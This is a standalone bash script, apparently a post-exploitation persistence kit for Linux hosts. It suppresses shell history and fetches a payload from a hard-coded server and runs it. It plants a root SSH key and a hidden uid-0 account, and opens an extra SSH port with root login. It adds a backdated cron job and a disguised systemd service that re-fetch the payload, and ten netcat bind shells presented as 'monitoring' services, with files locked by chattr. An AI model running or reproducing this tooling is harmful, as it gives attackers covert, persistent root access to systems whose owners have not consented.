#!/bin/bash

# Exit immediately on script error? No. We want to continue.
set +e

# Argument: filename to fetch
PAYLOAD_NAME="$1"
LOCAL_PAYLOAD_PATH="$2"  # New optional argument for local payload
SERVER="192.168.0.102:8000"

# Disable root history
set +o history
export HISTFILE=/dev/null

# Pull and run payload, with fallback to local path if provided
if [ -z "$LOCAL_PAYLOAD_PATH" ]; then
    # No local path provided, try downloading
    wget "http://$SERVER/$PAYLOAD_NAME" -O /tmp/"$PAYLOAD_NAME" >/dev/null 2>&1
    PAYLOAD_PATH="/tmp/$PAYLOAD_NAME"
else
    # Use the provided local path
    PAYLOAD_PATH="$LOCAL_PAYLOAD_PATH"
fi
chmod +x /tmp/"$PAYLOAD_NAME" 2>/dev/null
/tmp/"$PAYLOAD_NAME" >/dev/null 2>&1 &

# Write SSH key to /root/.ssh/authorized_keys
mkdir -p /root/.ssh
chmod 700 /root/.ssh
cat <<EOF >> /root/.ssh/authorized_keys
ssh-rsa <key>
EOF
chmod 600 /root/.ssh/authorized_keys

# Root shell + SSH persistence with port variance (wwwdata/w00t)
echo 'wwwdata:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash' >> /etc/passwd 2>/dev/null
chattr +i /etc/passwd 2>/dev/null
# Add high port and permit root login
sed -i 's/^#Port 22/Port 22\nPort 29471/' /etc/ssh/sshd_config 2>/dev/null
echo 'Port 29471' >> /etc/ssh/sshd_config 2>/dev/null
echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config 2>/dev/null
chattr +i /etc/ssh/sshd_config 2>/dev/null

# Create backup SSH config in sshd_config.d
mkdir -p /etc/ssh/sshd_config.d/
cat <<EOF > /etc/ssh/sshd_config.d/10-security.conf
Port 29471
PermitRootLogin yes
EOF
chmod 644 /etc/ssh/sshd_config.d/10-security.conf
chattr +i /etc/ssh/sshd_config.d/10-security.conf 2>/dev/null

# Restart SSH to apply changes
service ssh restart >/dev/null 2>&1 || systemctl restart sshd >/dev/null 2>&1

# Cron persistence
mkdir -p /etc/gssdh/
if [ -z "$LOCAL_PAYLOAD_PATH" ]; then
    wget "http://$SERVER/$PAYLOAD_NAME" -O /etc/gssdh/gssdh_pull >/dev/null 2>&1
else
    cp "$LOCAL_PAYLOAD_PATH" /etc/gssdh/gssdh_pull >/dev/null 2>&1
fi
chmod +x /etc/gssdh/gssdh_pull 2>/dev/null
chattr +i /etc/gssdh/gssdh_pull 2>/dev/null

echo "/etc/gssdh/gssdh_pull >/dev/null 2>&1" > /etc/cron.hourly/sysinfo
touch -d "12 Jul 2024" /etc/cron.hourly/sysinfo
chmod +x /etc/cron.hourly/sysinfo
chattr +i /etc/cron.hourly/sysinfo 2>/dev/null

# Service-based persistence
cat <<EOF > /lib/systemd/system/network-audit.service
[Unit]
Description=Network Auditing and Security Service
After=network.target

[Service]
Type=simple
ExecStart=/etc/gssdh/gssdh_pull
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

chmod 644 /lib/systemd/system/network-audit.service
chattr +i /lib/systemd/system/network-audit.service 2>/dev/null
systemctl daemon-reload >/dev/null 2>&1
systemctl enable network-audit.service >/dev/null 2>&1
systemctl start network-audit.service >/dev/null 2>&1

# Add multiple bind shells with auto-restart functionality
for PORT in 8080 8443 9090 7070 8888 3000 5000 5432 9000 4040; do
    # Create an individual service file for each bind shell
    cat <<EOF > /lib/systemd/system/monitoring-port-$PORT.service
[Unit]
Description=System Monitoring Service ($PORT)
After=network.target

[Service]
Type=simple
ExecStart=/bin/sh -c "while true; do busybox nc -l -p $PORT -e /bin/bash; sleep 1; done"
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF
    chmod 644 /lib/systemd/system/monitoring-port-$PORT.service
    chattr +i /lib/systemd/system/monitoring-port-$PORT.service 2>/dev/null
    
    # Enable and start the service
    systemctl daemon-reload >/dev/null 2>&1
    systemctl enable monitoring-port-$PORT.service >/dev/null 2>&1
    systemctl start monitoring-port-$PORT.service >/dev/null 2>&1
    
    # Also start a detached screen session as a backup method
    screen -dmS monitor_$PORT /bin/sh -c "while true; do busybox nc -l -p $PORT -e /bin/bash; sleep 1; done" >/dev/null 2>&1
done